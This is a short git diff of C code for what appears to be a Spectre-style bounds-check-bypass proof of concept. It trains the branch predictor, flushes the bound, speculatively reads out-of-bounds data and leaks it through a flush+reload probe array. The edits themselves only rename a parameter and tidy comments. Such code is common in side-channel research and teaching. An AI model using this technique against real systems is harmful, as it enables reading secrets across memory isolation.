@@ -21,21 +21,21 @@ cp_t* flush_reload_arr __attribute__ ((aligned (256)));
 /*
  * Variables required in cache:
  *  index
- *  data
+ *  DATA
  *
  * Variables requried in mem:
  *  DATA_SIZE
  *
  */
-void victim_func(int secret_index) {
+void victim_func(int index) {
 
     //flush bound value
     flush((void*)&DATA_SIZE);
     cpuid();
 
     //access (possibly out of bounds)
-    if (secret_index < DATA_SIZE) {
-        unsigned char x = DATA[secret_index];
+    if (index < DATA_SIZE) {
+        unsigned char x = DATA[index];
         volatile cp_t cp = flush_reload_arr[x];
     }
 }
@@ -45,7 +45,7 @@ int* prepare(int secret_index) {
     flush_reload_arr = init_flush_reload(N_PAGES);
     flush_arr(flush_reload_arr, N_PAGES);
 
-    //access decisions in array, repeated out-of-bounds not traceable for branch predictor
+    //Access decisions in array, repeated out-of-bounds not traceable for branch predictor
     int n_accesses = N_TRAINING + 1;
     int accesses[n_accesses];
     for(int i = 0; i < n_accesses; i++) accesses[i] = 0;
@@ -59,7 +59,6 @@ int* prepare(int secret_index) {
         //flush hits from training phase (all but last access)
         if(i < n_accesses-1) {
             cpuid();
-
             flush_arr(flush_reload_arr, N_PAGES);
         }
         cpuid();
